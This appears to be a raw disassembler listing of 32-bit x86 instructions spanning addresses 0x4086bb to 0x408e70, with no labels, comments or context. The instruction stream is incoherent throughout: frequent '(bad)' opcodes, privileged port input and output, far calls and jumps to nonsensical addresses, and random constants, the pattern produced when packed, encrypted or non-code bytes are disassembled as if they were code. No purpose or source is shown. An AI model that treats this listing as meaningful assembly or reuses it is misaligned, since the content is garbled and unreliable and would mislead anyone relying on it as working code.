  4086bb:	mov    eax,ds:0x8ac8adda
  4086c0:	xor    bh,BYTE PTR [edi+ecx*8-0x52]
  4086c4:	inc    bp
  4086c6:	mov    dh,0xdc
  4086c8:	add    edi,esi
  4086ca:	fsub   QWORD PTR [esi-0xca3b71e]
  4086d0:	mov    al,ds:0x1ab64855
  4086d5:	adc    eax,0x4d243e75
  4086da:	push   ecx
  4086db:	or     DWORD PTR [ecx],eax
  4086dd:	mov    BYTE PTR [ecx],ah
  4086df:	add    al,0xfe
  4086e1:	and    BYTE PTR [ecx],ah
  4086e3:	and    ecx,ebp
  4086e5:	mov    ds:0x8806967b,eax
  4086ea:	push   ss
  4086eb:	mov    ch,bl
  4086ed:	xor    BYTE PTR [edi+0x10],cl
  4086f0:	jge    0x4086ab
  4086f2:	inc    ebp
  4086f3:	and    ebx,DWORD PTR [eax-0x10]
  4086f6:	adc    DWORD PTR ds:0xc48fc74d,0x56e2f8c0
  408700:	call   0x362c:0xf73670eb
  408707:	xchg   esp,eax
  408708:	cmc    
  408709:	ret    0xec7d
  40870c:	pushf  
  40870d:	jo     0x40877c
  40870f:	cdq    
  408710:	stos   BYTE PTR es:[edi],al
  408711:	out    dx,al
  408712:	push   ebx
  408713:	repnz cmp ecx,DWORD PTR [edx]
  408716:	clc    
  408717:	stc    
  408718:	cmp    al,0xf2
  40871a:	popa   
  40871b:	leave  
  40871c:	mov    ah,0x8d
  40871e:	and    eax,0x28241b02
  408723:	or     DWORD PTR [edi-0x6127003a],edx
  408729:	lea    ecx,[esi+ebx*8-0x5a]
  40872d:	cli    
  40872e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872f:	out    0x5c,eax
  408731:	ins    DWORD PTR es:[edi],dx
  408732:	stos   DWORD PTR es:[edi],eax
  408733:	cmp    DWORD PTR [edi+0x54],edx
  408736:	xlat   BYTE PTR ds:[ebx]
  408737:	pop    esi
  408738:	mov    dl,0x4d
  40873a:	and    DWORD PTR [eax],edi
  40873c:	or     al,0x6f
  40873e:	cmp    DWORD PTR [edi-0x805169e],edx
  408744:	add    eax,0x33811744
  408749:	aad    0x33
  40874b:	xchg   esi,eax
  40874c:	out    dx,eax
  40874d:	bound  ebp,QWORD PTR [eax-0x78c9fc6a]
  408753:	mov    cl,0x5
  408755:	jns    0x4087b8
  408757:	pop    eax
  408758:	push   esp
  408759:	jp     0x408761
  40875b:	(bad)  
  40875c:	jmp    0x4086e6
  40875e:	popa   
  40875f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408760:	jle    0x40871d
  408762:	es int 0xef
  408765:	jecxz  0x40872f
  408767:	or     al,0x69
  408769:	(bad)  
  40876a:	mov    edx,0xceee70da
  40876f:	push   cs
  408770:	xchg   esi,eax
  408771:	xchg   BYTE PTR [eax-0x7a],al
  408774:	div    BYTE PTR [edi+ebx*1-0x5e]
  408778:	sub    BYTE PTR [eax],0x59
  40877b:	xor    edx,DWORD PTR [edx-0x2f1aca91]
  408781:	mov    cl,0x7b
  408783:	aas    
  408784:	and    al,0xe9
  408786:	push   es
  408787:	mov    BYTE PTR [eax-0x2],dh
  40878a:	sbb    edx,esi
  40878c:	pop    ebp
  40878d:	test   al,0xe7
  40878f:	mov    al,BYTE PTR [ecx+0x523a5364]
  408795:	add    ch,cl
  408797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408798:	shl    DWORD PTR [ebx+eax*2],0xc5
  40879c:	daa    
  40879d:	sub    ecx,DWORD PTR [edi+0x2150789f]
  4087a3:	sbb    al,0x39
  4087a5:	popa   
  4087a6:	popf   
  4087a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087a8:	jle    0x4087d6
  4087aa:	mov    ds:0x91edaf7,eax
  4087af:	ret    
  4087b0:	dec    eax
  4087b1:	add    bh,bl
  4087b3:	mov    eax,0x427eef4f
  4087b8:	cld    
  4087b9:	and    ch,BYTE PTR es:[eax+ebx*2-0x21]
  4087be:	pop    edx
  4087bf:	sbb    al,0x9
  4087c1:	pop    esp
  4087c2:	ror    ch,cl
  4087c4:	mov    eax,0x5f01a8c4
  4087c9:	lahf   
  4087ca:	in     eax,0x5e
  4087cc:	xchg   edi,eax
  4087cd:	mov    ds:0x59b2184a,al
  4087d2:	outs   dx,DWORD PTR ds:[esi]
  4087d3:	jo     0x4087c1
  4087d5:	dec    eax
  4087d6:	(bad)  
  4087d7:	enter  0x692d,0x8e
  4087db:	icebp  
  4087dc:	fldenv [ebx-0x3a]
  4087df:	mov    ah,0xc5
  4087e1:	popf   
  4087e2:	loop   0x408816
  4087e4:	mov    edx,0xdfe4f97d
  4087e9:	ss adc eax,0xfb96303
  4087ef:	das    
  4087f0:	push   ds
  4087f1:	cmp    esi,ebp
  4087f3:	outs   dx,DWORD PTR ds:[esi]
  4087f4:	cmp    al,0x59
  4087f6:	xchg   edi,eax
  4087f7:	mov    dh,0x52
  4087f9:	test   DWORD PTR [eax],eax
  4087fb:	pop    ecx
  4087fc:	pushf  
  4087fd:	mov    edx,0xf0b8caa1
  408802:	or     bh,BYTE PTR [edi]
  408804:	mov    ecx,esi
  408806:	sub    DWORD PTR [ebp-0x56],edx
  408809:	push   ebx
  40880a:	sbb    eax,0xa1377f6
  40880f:	out    dx,eax
  408810:	sub    al,0x21
  408812:	jle    0x408863
  408814:	jg     0x40887d
  408816:	jb     0x408827
  408818:	inc    eax
  408819:	pop    ecx
  40881a:	mov    ds:0x1e9f9976,eax
  40881f:	fisttp WORD PTR [ebp-0x6a69619c]
  408825:	je     0x4087f3
  408827:	(bad)  
  408828:	nop
  408829:	outs   dx,DWORD PTR ds:[esi]
  40882a:	adc    BYTE PTR [ebx+ebx*4-0x67],ah
  40882e:	mov    ecx,0x3066702
  408833:	jmp    0x3ee2:0x3d52b4c0
  40883a:	(bad)  [esi]
  40883c:	loope  0x4087ea
  40883e:	div    DWORD PTR [ebx+eax*8]
  408841:	pop    es
  408842:	call   0xf460:0x9bfe9a7e
  408849:	add    edx,DWORD PTR [ecx]
  40884b:	xlat   BYTE PTR ds:[ebx]
  40884c:	out    dx,eax
  40884d:	jge    0x4087fa
  40884f:	jecxz  0x40888d
  408851:	mov    ebx,0xd11ee700
  408856:	xchg   edi,edx
  408858:	jge    0x408811
  40885a:	mov    bh,0x2a
  40885c:	jp     0x4088b7
  40885e:	arpl   WORD PTR [edi-0x2],ax
  408861:	dec    edx
  408862:	test   WORD PTR [edi],di
  408865:	jb     0x40886e
  408867:	inc    edx
  408868:	xchg   ebx,eax
  408869:	jae    0x408829
  40886b:	test   edx,ebx
  40886d:	xchg   ebx,eax
  40886e:	xchg   esp,eax
  40886f:	(bad)  
  408870:	pop    ebp
  408871:	or     al,0xa2
  408873:	jmp    0x4088a7
  408875:	pop    ecx
  408876:	mov    dl,0x77
  408878:	and    BYTE PTR [edx-0x77ecc7a5],0x16
  40887f:	push   edi
  408880:	in     eax,0xae
  408882:	or     BYTE PTR [ecx],0xd2
  408885:	(bad)  
  408886:	or     eax,0x16644d6e
  40888b:	xchg   BYTE PTR [edx+0x54bf692],bh
  408891:	les    esi,FWORD PTR [ebx]
  408893:	and    BYTE PTR [edx+0x7bcd298d],al
  408899:	call   0x3b1:0xc4a6976f
  4088a0:	aaa    
  4088a1:	sbb    DWORD PTR [ecx-0x29568d65],edi
  4088a7:	pop    ebp
  4088a8:	jo     0x408905
  4088aa:	jno    0x408838
  4088ac:	dec    esi
  4088ad:	test   eax,0x89d00c03
  4088b2:	mov    ds:0x60b96084,al
  4088b7:	xor    eax,0x69c4d6bd
  4088bc:	adc    ebp,DWORD PTR [ebx+ecx*4]
  4088bf:	or     eax,0x9097bc22
  4088c4:	es mov bl,0x8
  4088c7:	imul   ebx,DWORD PTR [edi-0x5b],0x76bc48a9
  4088ce:	and    DWORD PTR [eax],0x15a5020f
  4088d4:	cmp    eax,0x62f72835
  4088d9:	jp     0x408935
  4088db:	jp     0x4088f5
  4088dd:	imul   ebp,DWORD PTR [edx-0x4f0bff08],0x18
  4088e4:	cmp    al,0x77
  4088e6:	mov    ah,0x14
  4088e8:	sub    BYTE PTR [ecx-0x47fe1229],bl
  4088ee:	push   edi
  4088ef:	out    dx,al
  4088f0:	sub    BYTE PTR [ebp+esi*8+0x69],al
  4088f4:	cs in  al,dx
  4088f6:	push   eax
  4088f7:	jo     0x4088a2
  4088f9:	inc    DWORD PTR [ebx-0x57]
  4088fc:	iret   
  4088fd:	aaa    
  4088fe:	pusha  
  4088ff:	jae    0x40895b
  408901:	js     0x4088ac
  408903:	ins    BYTE PTR es:[edi],dx
  408904:	and    BYTE PTR [edi],ch
  408906:	xor    ecx,DWORD PTR ss:[ecx]
  408909:	pop    eax
  40890a:	sbb    al,0x5
  40890c:	cmp    bl,BYTE PTR [ebp+0x22]
  40890f:	cld    
  408910:	popf   
  408911:	lock call 0xa68b2d6
  408917:	bound  esi,QWORD PTR [edi+0x313062e4]
  40891d:	mov    WORD PTR [ebp+0xb],es
  408920:	pop    esi
  408921:	mov    al,ds:0x3f6df3a5
  408926:	adc    al,BYTE PTR [ebp+0x53]
  408929:	mov    dl,BYTE PTR [edi]
  40892b:	jne    0x408952
  40892d:	stos   DWORD PTR es:[edi],eax
  40892e:	aam    0x75
  408930:	stos   BYTE PTR es:[edi],al
  408931:	stos   BYTE PTR es:[edi],al
  408932:	mov    edx,ss
  408934:	and    al,0x7
  408936:	jmp    0xf689:0xa3e9f2dc
  40893d:	xchg   ecx,eax
  40893e:	pop    edx
  40893f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408940:	cmp    al,0x74
  408942:	dec    edx
  408943:	xchg   edi,eax
  408944:	sbb    eax,0x323ce0e8
  408949:	adc    eax,0x63f87ad3
  40894e:	nop
  40894f:	(bad)  
  408951:	daa    
  408952:	lock sbb bh,bh
  408955:	xor    BYTE PTR [edx],al
  408957:	pop    esi
  408958:	jmp    0x4088dd
  40895a:	es jne 0x408997
  40895d:	mov    ss,ecx
  40895f:	cmp    al,BYTE PTR ds:0x2dcd1cff
  408965:	cdq    
  408966:	inc    esi
  408967:	add    ah,cl
  408969:	ret    
  40896a:	mov    bh,BYTE PTR [edx]
  40896c:	ins    DWORD PTR es:[edi],dx
  40896d:	std    
  40896e:	mov    esp,0x6fade2bf
  408973:	add    DWORD PTR [edx-0x4b],edx
  408976:	out    dx,eax
  408977:	dec    eax
  408978:	test   al,ch
  40897a:	mov    WORD PTR [eax+ebx*4+0x53eaaa2c],?
  408981:	pop    ecx
  408982:	test   al,0xd4
  408984:	ds and dh,bh
  408987:	push   ebx
  408988:	mov    eax,0xba86ef0a
  40898d:	out    0xc3,al
  40898f:	test   eax,0x6e7225a1
  408994:	inc    ebp
  408995:	(bad)  [ebp+ebp*4-0x153cb623]
  40899c:	xchg   ebp,eax
  40899d:	xor    DWORD PTR [ebx-0x3d],0x9df2827
  4089a4:	jp     0x4089b0
  4089a6:	mov    edx,0x1f2ec54f
  4089ab:	xchg   esp,eax
  4089ac:	xor    ah,BYTE PTR [edx]
  4089ae:	aam    0xa7
  4089b0:	mov    bh,0x3f
  4089b2:	call   0xdd12:0xdd98cda9
  4089b9:	xchg   edi,eax
  4089ba:	pop    esi
  4089bb:	fnstsw WORD PTR [esi+0x60]
  4089be:	(bad)  
  4089bf:	dec    edx
  4089c0:	and    DWORD PTR [eax-0x7302d265],ebp
  4089c6:	(bad)  
  4089c7:	fldcw  WORD PTR ds:0x842b6aba
  4089cd:	inc    esp
  4089ce:	jnp    0x4089c9
  4089d0:	scas   eax,DWORD PTR es:[edi]
  4089d1:	ins    DWORD PTR es:[edi],dx
  4089d2:	add    bh,BYTE PTR [edx]
  4089d4:	xchg   ebp,eax
  4089d5:	xchg   ebx,eax
  4089d6:	lahf   
  4089d7:	sbb    BYTE PTR [eax+0x3b1d48ed],cl
  4089dd:	jmp    0x7ae22f08
  4089e2:	or     ebp,DWORD PTR [ecx+edi*2-0x77ad2c2a]
  4089e9:	jmp    0x408982
  4089eb:	pop    edx
  4089ec:	xchg   ecx,eax
  4089ed:	mov    eax,0xce6f71eb
  4089f2:	adc    al,0x24
  4089f4:	mov    dh,0xf0
  4089f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f7:	lahf   
  4089f8:	into   
  4089f9:	in     al,0xec
  4089fb:	mov    dh,0xc
  4089fd:	repnz or edi,edx
  408a00:	mov    ch,al
  408a02:	jns    0x4089d7
  408a04:	fdivrp st(1),st
  408a06:	aam    0x33
  408a08:	daa    
  408a09:	cmp    DWORD PTR [esi],edi
  408a0b:	push   edx
  408a0c:	dec    ebp
  408a0d:	adc    DWORD PTR [edx+0x5d],ebx
  408a10:	jnp    0x408a8f
  408a12:	(bad)  
  408a14:	xchg   ecx,eax
  408a15:	cdq    
  408a16:	mov    ecx,DWORD PTR [esi]
  408a18:	rcr    BYTE PTR [eax-0x34b09245],cl
  408a1e:	dec    ebp
  408a1f:	dec    eax
  408a20:	stos   BYTE PTR es:[edi],al
  408a21:	push   edi
  408a22:	fstp   TBYTE PTR [ebp-0x75e4a8b6]
  408a28:	and    ah,ch
  408a2a:	xor    al,0x15
  408a2c:	xor    BYTE PTR [edi+0x63],bl
  408a2f:	outs   dx,DWORD PTR ds:[esi]
  408a30:	ins    BYTE PTR es:[edi],dx
  408a31:	imul   esi,DWORD PTR [ecx+0x62],0x1b1eecb0
  408a38:	sti    
  408a39:	lods   eax,DWORD PTR ds:[esi]
  408a3a:	dec    esp
  408a3b:	in     al,0x50
  408a3d:	bound  edx,QWORD PTR [ebp+edx*2-0x4c3e3842]
  408a44:	cld    
  408a45:	outs   dx,DWORD PTR es:[esi]
  408a47:	les    ecx,FWORD PTR [ebp+ebp*8+0x62]
  408a4b:	jmp    0x4089db
  408a4d:	fidivr DWORD PTR [edx+edi*4]
  408a50:	popf   
  408a51:	nop
  408a52:	std    
  408a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a54:	aam    0x5f
  408a56:	push   ebx
  408a57:	adc    ah,bh
  408a59:	dec    ebx
  408a5a:	sub    dh,BYTE PTR [eax]
  408a5c:	pop    ebp
  408a5d:	fwait
  408a5e:	sub    al,0xa3
  408a60:	jmp    0x328521e0
  408a65:	shr    DWORD PTR [esi+eiz*1],0x2f
  408a69:	cld    
  408a6a:	fisub  DWORD PTR [esi+0x2e52b429]
  408a70:	into   
  408a71:	jmp    0x537d6370
  408a76:	dec    ecx
  408a77:	sbb    al,0x71
  408a79:	adc    edi,DWORD PTR [eax]
  408a7b:	repz test BYTE PTR [ecx-0x52],bl
  408a7f:	cmp    eax,0x153f9cf6
  408a84:	int    0x3b
  408a86:	xchg   esp,eax
  408a87:	dec    edi
  408a88:	cld    
  408a89:	in     al,0xd3
  408a8b:	mov    al,cs:0x7c5ac07a
  408a91:	mov    ecx,0x3d81d9aa
  408a96:	and    ax,0xc043
  408a9a:	xchg   edi,eax
  408a9b:	sbb    DWORD PTR ds:[ebp+edx*4+0x77],edi
  408aa0:	scas   al,BYTE PTR es:[edi]
  408aa1:	fiadd  WORD PTR ds:0x6cc3db42
  408aa7:	sbb    DWORD PTR [ebp-0x5a8eae02],edi
  408aad:	pop    eax
  408aae:	dec    esp
  408aaf:	mov    ch,0x4b
  408ab1:	push   edi
  408ab2:	push   ecx
  408ab3:	and    esp,ecx
  408ab5:	mov    bh,bh
  408ab7:	shl    BYTE PTR [eax-0x4f],1
  408aba:	pop    edi
  408abb:	jge    0x408ac0
  408abd:	add    BYTE PTR [ecx+0x26f641cd],dl
  408ac3:	adc    ah,BYTE PTR [ebx]
  408ac5:	dec    ebx
  408ac6:	dec    ebp
  408ac7:	mov    eax,0x279af1f9
  408acc:	push   ebp
  408acd:	inc    esi
  408ace:	cmp    al,cl
  408ad0:	or     ecx,DWORD PTR [edx-0x3ffacefb]
  408ad6:	ja     0x408a90
  408ad8:	mov    ebx,0xf472c402
  408add:	xrelease xchg DWORD PTR [ebx],ecx
  408ae0:	push   0x48d4f604
  408ae5:	jbe    0x408a98
  408ae7:	xchg   esp,eax
  408ae8:	or     bl,BYTE PTR [eax-0x33f341da]
  408aee:	or     al,dl
  408af0:	loope  0x408b6c
  408af2:	mov    eax,ds:0xc2bcef52
  408af7:	xor    ebx,DWORD PTR ds:[eax+0x4]
  408afb:	ret    
  408afc:	cld    
  408afd:	inc    BYTE PTR [esi-0x6a87e7b8]
  408b03:	mov    ch,0xac
  408b05:	mov    esp,0x8dc4acc8
  408b0a:	or     esi,esi
  408b0c:	loope  0x408b6b
  408b0e:	pop    ebp
  408b0f:	arpl   sp,cx
  408b11:	in     al,0xf3
  408b13:	mov    cl,BYTE PTR [edi-0x3b]
  408b16:	pop    edi
  408b17:	or     eax,esi
  408b19:	push   es
  408b1a:	mov    bh,0x30
  408b1c:	jne    0x408b24
  408b1e:	jo     0x408abe
  408b20:	leave  
  408b21:	pop    ecx
  408b22:	jp     0x408b0c
  408b24:	dec    esi
  408b25:	pop    eax
  408b26:	adc    BYTE PTR [esp+edx*2-0x39b5359f],bl
  408b2d:	cmp    eax,0x5cb51c8
  408b32:	cld    
  408b33:	cmp    eax,0x21ed152d
  408b38:	and    DWORD PTR [edx-0x7e],edx
  408b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b3c:	int    0xf6
  408b3e:	ss popf 
  408b40:	aad    0x59
  408b42:	fidiv  DWORD PTR [ebx-0x54182b2f]
  408b48:	sub    esi,edi
  408b4a:	add    DWORD PTR [edi-0x2b],esp
  408b4d:	sbb    edx,ecx
  408b4f:	enter  0xbe83,0x10
  408b53:	imul   ecx,DWORD PTR ds:0xb95ecb42,0x362cab2
  408b5d:	xchg   edx,eax
  408b5e:	fwait
  408b5f:	xor    BYTE PTR [eax-0x2f],0xd4
  408b63:	(bad)  
  408b64:	in     eax,0xd
  408b66:	and    ebx,ecx
  408b68:	ret    0x3b4b
  408b6b:	std    
  408b6c:	lods   eax,DWORD PTR ds:[esi]
  408b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6e:	push   esp
  408b6f:	cwde   
  408b70:	or     cl,BYTE PTR [edi-0x56]
  408b73:	loope  0x408b1f
  408b75:	test   eax,0xc6b28911
  408b7a:	in     al,dx
  408b7b:	pop    ds
  408b7c:	mov    dl,BYTE PTR [edi+0x42df3867]
  408b82:	pushf  
  408b83:	mov    edi,0xf5df1c81
  408b88:	mov    bl,0xc1
  408b8a:	push   ebx
  408b8b:	cli    
  408b8c:	das    
  408b8d:	test   BYTE PTR [edx],al
  408b8f:	mov    eax,0x35efe99a
  408b94:	mov    BYTE PTR [eax-0x20],bl
  408b97:	ins    DWORD PTR es:[edi],dx
  408b98:	pop    ebx
  408b99:	lahf   
  408b9a:	lahf   
  408b9b:	ret    0x8992
  408b9e:	mov    edx,0x66ae0cc3
  408ba3:	jbe    0x408b80
  408ba5:	pusha  
  408ba6:	fdivr  st,st(3)
  408ba8:	jge    0x408c02
  408baa:	shl    BYTE PTR es:[edx-0x49],0x2b
  408baf:	cmp    al,0x24
  408bb1:	sub    BYTE PTR ds:0x2f24d3d3,dh
  408bb7:	pushf  
  408bb8:	cs pusha 
  408bba:	in     eax,0x7b
  408bbc:	into   
  408bbd:	int3   
  408bbe:	cmp    DWORD PTR [ebx+0x2bf1c16f],esi
  408bc4:	pop    edi
  408bc5:	xchg   ecx,eax
  408bc6:	lds    ecx,FWORD PTR [esi]
  408bc8:	cmp    al,0x7f
  408bca:	jg     0x408c12
  408bcc:	addr16 test eax,0xf5d6a15d
  408bd2:	in     eax,dx
  408bd3:	les    ebp,FWORD PTR [esi+0x33e8bf56]
  408bd9:	leave  
  408bda:	mov    edi,0xa7c24e1f
  408bdf:	adc    al,0x2d
  408be1:	call   0xdf70:0xdd89930a
  408be8:	das    
  408be9:	jg     0x408c21
  408beb:	leave  
  408bec:	push   ebx
  408bed:	push   ebx
  408bee:	loop   0x408c24
  408bf0:	pop    ecx
  408bf1:	fcomp  QWORD PTR [ebp-0x37838c59]
  408bf7:	mov    ds:0x66b46dbf,eax
  408bfc:	xor    BYTE PTR [eax],cl
  408bfe:	cdq    
  408bff:	cs mov cl,0x7f
  408c02:	into   
  408c03:	mul    BYTE PTR [ecx+0x50bb04a5]
  408c09:	or     esi,DWORD PTR [esi-0x23]
  408c0c:	lock pop esp
  408c0e:	push   esi
  408c0f:	jb     0x408c84
  408c11:	inc    esi
  408c12:	(bad)  
  408c13:	arpl   WORD PTR [edi],sp
  408c15:	and    ah,BYTE PTR [eax+0x25]
  408c18:	pop    eax
  408c19:	imul   ebx,esp,0x8c74984a
  408c1f:	jmp    FWORD PTR [eax]
  408c21:	jg     0x408c19
  408c23:	retf   
  408c24:	xchg   edi,eax
  408c25:	pop    ss
  408c26:	inc    esp
  408c27:	sub    ecx,ebp
  408c29:	bound  ebx,QWORD PTR [ecx-0x7deaae2e]
  408c2f:	pop    esp
  408c30:	mov    bh,0xb0
  408c32:	test   bl,0x67
  408c35:	pop    ebp
  408c36:	pop    ds
  408c37:	jmp    0x9f8d893a
  408c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c3d:	inc    BYTE PTR [esp+eiz*8]
  408c40:	cdq    
  408c41:	lock stos BYTE PTR es:[edi],al
  408c43:	data16 jb 0x408c0d
  408c46:	ret    0x4b91
  408c49:	pop    eax
  408c4a:	js     0x408c88
  408c4c:	inc    esp
  408c4d:	mov    esp,0xfe53ffe9
  408c52:	jmp    0x8cb363db
  408c57:	xchg   esi,eax
  408c58:	stc    
  408c59:	or     edi,DWORD PTR ss:[ebx]
  408c5c:	or     BYTE PTR [ebx+0x175ea2b5],0x8c
  408c63:	out    0xd6,al
  408c65:	and    al,0x8c
  408c67:	mov    bh,0x76
  408c69:	mov    eax,0xd22b241
  408c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c6f:	xor    BYTE PTR [esi+0x129b86ff],bh
  408c75:	xor    BYTE PTR [edx-0x6f0c5e09],0xd5
  408c7c:	sbb    ah,BYTE PTR [esi]
  408c7e:	add    ah,BYTE PTR [edi-0x677ab7e]
  408c84:	jcxz   0x408c63
  408c87:	mov    bl,cl
  408c89:	call   0xbfcd:0x5a4def82
  408c90:	jmp    0xe0f0a1af
  408c95:	in     eax,dx
  408c96:	(bad)  
  408c97:	call   DWORD PTR [ecx+edi*1-0x6c1477e0]
  408c9e:	cmc    
  408c9f:	fadd   QWORD PTR [esi+0xc6b10e0]
  408ca5:	mov    eax,0x6eacbb40
  408caa:	push   ebp
  408cab:	in     al,dx
  408cac:	push   edi
  408cad:	inc    ebp
  408cae:	aas    
  408caf:	mov    edx,0x58ac0db0
  408cb4:	jp     0x408c9e
  408cb6:	jne    0x408cff
  408cb8:	sub    DWORD PTR [eax-0x3d60d4fd],ebp
  408cbe:	push   esp
  408cbf:	sub    eax,0xf858aec0
  408cc4:	push   edi
  408cc5:	clc    
  408cc6:	dec    esp
  408cc7:	(bad)  
  408cc8:	sub    al,0x30
  408cca:	lods   al,BYTE PTR ds:[esi]
  408ccb:	je     0x408d2c
  408ccd:	jo     0x408cca
  408ccf:	mov    ecx,0x38687e10
  408cd4:	into   
  408cd5:	(bad)  
  408cd6:	or     eax,0xc784bba7
  408cdb:	pop    ecx
  408cdc:	dec    ebp
  408cdd:	mov    ds:0xd91ba73f,al
  408ce2:	sahf   
  408ce3:	mov    dl,0xc3
  408ce5:	shr    DWORD PTR [ebx-0x13],0xcc
  408ce9:	cmp    al,0x1a
  408ceb:	sahf   
  408cec:	pushf  
  408ced:	pop    ebp
  408cee:	mov    WORD PTR [edx],?
  408cf0:	call   0xa4c1:0xf7647bfa
  408cf7:	adc    ecx,DWORD PTR [esi+0x5e]
  408cfa:	jae    0x408d4d
  408cfc:	and    BYTE PTR [ebx+0x38],0x32
  408d00:	outs   dx,BYTE PTR ds:[esi]
  408d01:	out    dx,eax
  408d02:	xchg   edi,eax
  408d03:	or     al,0x2b
  408d05:	test   eax,0x80a62bd1
  408d0a:	and    DWORD PTR [eax+0x6b],esi
  408d0d:	dec    esi
  408d0e:	pop    es
  408d0f:	mov    dh,0x9e
  408d11:	jmp    0xe9213435
  408d16:	fs inc esi
  408d18:	imul   edx,DWORD PTR [eax-0x2f],0x151a636d
  408d1f:	add    eax,0x24ae4545
  408d24:	pusha  
  408d25:	inc    eax
  408d26:	jo     0x408caa
  408d28:	adc    bh,BYTE PTR [edx]
  408d2a:	mov    edi,0x4de4aa6d
  408d2f:	jmp    0x408d5e
  408d31:	sbb    BYTE PTR [ebx+0x7b],0x22
  408d35:	sbb    ebx,ebp
  408d37:	and    ah,0xc2
  408d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d3b:	test   DWORD PTR [eax-0x1e],edi
  408d3e:	add    al,dh
  408d40:	inc    ecx
  408d41:	retf   0x7e2a
  408d44:	into   
  408d45:	leave  
  408d46:	xor    DWORD PTR [ebp-0x438c881b],edx
  408d4c:	cmp    esi,DWORD PTR [ebp+edx*8+0x3b]
  408d50:	mov    dh,0x5d
  408d52:	retf   0x324
  408d55:	inc    ecx
  408d56:	pusha  
  408d57:	inc    esi
  408d58:	pop    ecx
  408d59:	mov    dh,0xe
  408d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d5c:	or     ebx,esp
  408d5e:	lahf   
  408d5f:	ss pop eax
  408d61:	mov    dl,0x4
  408d63:	imul   ecx,DWORD PTR [ecx],0x324ccbd5
  408d69:	adc    BYTE PTR [edx-0x2022045a],cl
  408d6f:	xchg   al,ah
  408d71:	cld    
  408d72:	add    bl,dh
  408d74:	sub    DWORD PTR [edx+0x30f23adf],esi
  408d7a:	push   ebx
  408d7b:	push   0x4a1cd72c
  408d80:	jmp    0x408d3f
  408d82:	ss jge 0x408d2b
  408d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d86:	les    esp,FWORD PTR [ebx-0x3a74fe5a]
  408d8c:	lea    ebx,[edi+0x25]
  408d8f:	xor    al,0xe0
  408d91:	xor    al,0x7e
  408d93:	sti    
  408d94:	mov    al,0xa2
  408d96:	push   esi
  408d97:	shr    DWORD PTR [eax-0x4d],0x8c
  408d9b:	sbb    al,0xfb
  408d9d:	xchg   ecx,eax
  408d9e:	ds js  0x408d90
  408da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408da2:	aas    
  408da3:	pop    ds
  408da4:	or     eax,0x7e8f4f96
  408da9:	pusha  
  408daa:	and    al,0x42
  408dac:	sub    esi,esp
  408dae:	arpl   WORD PTR [ecx],dx
  408db0:	int    0x7a
  408db2:	cmp    ch,ch
  408db4:	mov    WORD PTR [edi+0x7d],?
  408db7:	xchg   edx,eax
  408db8:	xor    ebx,ebx
  408dba:	mov    edi,0x8875dbfa
  408dbf:	repz cld 
  408dc1:	test   BYTE PTR ds:0x531f715a,bl
  408dc7:	and    cl,BYTE PTR [eax+edx*2]
  408dca:	mov    bl,0xea
  408dcc:	inc    ebx
  408dcd:	cmp    ebp,DWORD PTR [ebx]
  408dcf:	js     0x408df1
  408dd1:	aas    
  408dd2:	mov    WORD PTR [eax-0x6b],?
  408dd5:	retf   
  408dd6:	or     DWORD PTR [esi+0x6],0xffffffdb
  408dda:	scas   eax,DWORD PTR es:[edi]
  408ddb:	mov    ebx,0xd16f4a67
  408de0:	arpl   WORD PTR [edx],cx
  408de2:	xchg   dh,al
  408de4:	(bad)  
  408de5:	(bad)  
  408de6:	and    al,0xd3
  408de8:	mov    dh,bl
  408dea:	gs pop ebx
  408dec:	xor    BYTE PTR [eax+0x6f0dfd6e],0xee
  408df3:	rcr    DWORD PTR [ecx],cl
  408df5:	dec    edx
  408df6:	dec    eax
  408df7:	xor    al,0xe6
  408df9:	mov    dh,0xf
  408dfb:	mov    edx,0x7cf06c5
  408e00:	leave  
  408e01:	and    ah,al
  408e03:	outs   dx,BYTE PTR ds:[esi]
  408e04:	sar    BYTE PTR [ebx+0x5e],1
  408e07:	mov    bh,BYTE PTR [edx]
  408e09:	shr    ebp,0xce
  408e0c:	dec    ecx
  408e0d:	xchg   ebp,eax
  408e0e:	jb     0x408e4d
  408e10:	cmp    DWORD PTR [ecx],0x41293ace
  408e16:	cmp    ch,BYTE PTR [ecx-0x25]
  408e19:	jg     0x408e01
  408e1b:	out    dx,al
  408e1c:	or     DWORD PTR [ecx-0xe71270],eax
  408e22:	jg     0x408dfc
  408e24:	stos   DWORD PTR es:[edi],eax
  408e25:	xor    edi,edi
  408e27:	mov    eax,DWORD PTR [esi]
  408e29:	popf   
  408e2a:	push   ss
  408e2b:	leave  
  408e2c:	(bad)  
  408e2d:	push   ebp
  408e2e:	xor    ebx,DWORD PTR [esi-0x7c37e81c]
  408e34:	cmp    al,0xa5
  408e36:	and    al,0xaf
  408e38:	icebp  
  408e39:	adc    edx,ebp
  408e3b:	outs   dx,BYTE PTR ds:[esi]
  408e3c:	inc    ebx
  408e3d:	out    0xc2,al
  408e3f:	mov    ss,WORD PTR [ebp+ebp*8+0x17]
  408e43:	jle    0x408de1
  408e45:	call   0xab2c83a1
  408e4a:	jae    0x408e73
  408e4c:	sbb    ch,BYTE PTR [ebx]
  408e4e:	sbb    BYTE PTR [ecx+0x8930dcb],al
  408e54:	call   0x56e68c20
  408e59:	or     ebp,DWORD PTR gs:[edx+0x58]
  408e5d:	cld    
  408e5e:	int    0x3b
  408e60:	repnz sbb eax,0x408a9bac
  408e66:	dec    ebp
  408e67:	mov    ch,0x20
  408e69:	sub    eax,0x912b5724
  408e6e:	sub    DWORD PTR [ebx],edi
  408e70:	sub    DWORD PTR [ecx-0x2c43bbc3],0xffffffb9
